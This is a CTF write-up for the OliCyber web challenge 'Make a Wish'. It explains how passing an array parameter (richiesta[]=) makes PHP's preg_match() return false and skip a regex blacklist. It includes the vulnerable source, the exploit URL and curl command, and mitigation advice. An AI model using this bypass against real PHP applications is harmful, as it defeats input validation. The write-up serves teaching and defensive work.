# Make a Wish

**Competition:** OliCyber<br>
**Category:** Web<br>
**URL:** http://make-a-wish.challs.olicyber.it

---

## Description

> I created the perfect blacklist! Nobody can bypass it

A website that filters requests with a regex, but the blacklist can be bypassed by exploiting PHP's type juggling.

---

## Solution

### Step 1 — Source Code Analysis

```php
<?php
  if(isset($_GET['richiesta'])) {
    if (preg_match("/.*/i", $_GET['richiesta'], $match)) {
      echo "No, mi dispiace non posso fare questo!";
    } else {
      echo "flag{TROVAMI}";
    }
  } else {
    echo "Fai una richiesta e provero a realizzarla";
  }
?>
```

The flag is printed **only** when `preg_match()` returns `0` (no match).

The regex used is `/.*/i`, which means:

| Part | Meaning |
|---|---|
| `.` | Any character except newline |
| `*` | Zero or more times |
| `i` | Case-insensitive |

At first glance it seems impossible to bypass: `.*` matches any string, even an empty one.

---

### Step 2 — Identifying the Vulnerability

The vulnerability lies in the behavior of `preg_match()` when it receives an **array** instead of a **string**:

- `preg_match()` returns **`false`** and emits a warning
- In the context of `if(false)`, the `else` branch is executed
- The flag is printed

The regex `/.*/i` is effectively unbeatable against any **string**. The issue is not the regex itself, but the assumption that `$_GET['richiesta']` is always a string. In PHP this is not guaranteed: a user can send arrays via the `[]` syntax in parameters.

---

### Step 3 — Exploitation

Just like in the *C Style Login* challenge, we exploit PHP's behavior with `[]` in the parameter name to send an array instead of a string.

```
richiesta=ciao    →   $_GET['richiesta'] = "ciao"   (string → preg_match matches → NO flag)
richiesta[]=      →   $_GET['richiesta'] = []        (array  → preg_match false   → FLAG )
```

**Method 1 — URL in the browser:**

Visit directly:

```
http://make-a-wish.challs.olicyber.it/?richiesta[]=
```

No need for Burp Suite — the `[]` syntax works directly in the URL.

**Method 2 — curl:**

```bash
curl "http://make-a-wish.challs.olicyber.it/?richiesta[]="
```

---

### Step 4 — Output

The response contains the flag:

```
flag{...}
```

---

## Vulnerability Exploited

| Aspect | Detail |
|---|---|
| **Type** | preg_match() Type Validation Bypass |
| **Root Cause** | preg_match() returns false when given an array |
| **Vector** | GET parameter with `[]` syntax |
| **Impact** | Regex blacklist bypass |

---

## Conclusions

- Validate input type before using it: `if (!is_string($_GET['richiesta']))`
- Use `=== false` instead of implicit evaluation to check `preg_match()` return value
- Never trust the type of data coming from `$_GET`, `$_POST`, `$_COOKIE`
- A perfect regex does not protect against invalid input types
- PHP's type flexibility requires explicit validation